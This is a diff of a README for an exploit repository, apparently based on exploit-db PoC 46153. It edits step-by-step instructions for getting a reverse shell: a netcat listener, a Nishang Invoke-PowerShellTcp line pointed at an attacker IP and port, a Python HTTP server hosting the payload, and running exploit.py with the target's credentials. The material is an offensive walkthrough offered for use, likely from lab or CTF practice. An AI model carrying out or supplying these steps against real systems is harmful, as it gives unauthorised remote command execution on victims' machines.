@@ -10,8 +10,7 @@ The provided script has been modified to download and execute a PowerShell scrip
 ## Requirements
 Step 1: Clone the Repository
 
-Step 2: Install Dependencies
-Ensure you have Python 3 installed. Install the required libraries:
+Step 2: Install Dependencies and ensure you have Python 3 installed:
 ```
 pip install requests beautifulsoup4
 pip3 install requests
@@ -23,15 +22,18 @@ Step 1: Open a listening port. For example:
 nc -vlnp 9090
 ```
 
-Step 2: Modify the bottom line of code of the nishang powershell script (i.e., Invoke-PowerShellTcp.ps1) to your own IP address and listening port.
+Step 2: Edit the bottom line of the Nishang Invoke-PowerShellTcp.ps1 script to reflect your attacking machine's IP address and listening port. For example:
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.12.6 -Port 9090
+```
 
-Step 3: Set up a http server (e.g., Python SimpleHTTPServer) on the directery where Invoke-PowerShellTcp.ps1 is located. For example:
+Step 3: Start a simple HTTP server to host the Nishang script in the same directory where Invoke-PowerShellTcp.ps1 is located. For example:
 ```
 python3 -m http.server 80
 ```
-Step 4: Modify lines 30, 35, 36, 37 in exploit.py accordingly (i.e., http server address, login, password, host)
+Step 4: Modify lines 30, 35, 36, 37 in exploit.py accordingly to match your setup (i.e., http server address, login, password, host)
 
-Step 5: Execute exploit.py
+Step 5: Run exploit.py
 
 ## Reference
 Original POC: https://www.exploit-db.com/exploits/46153
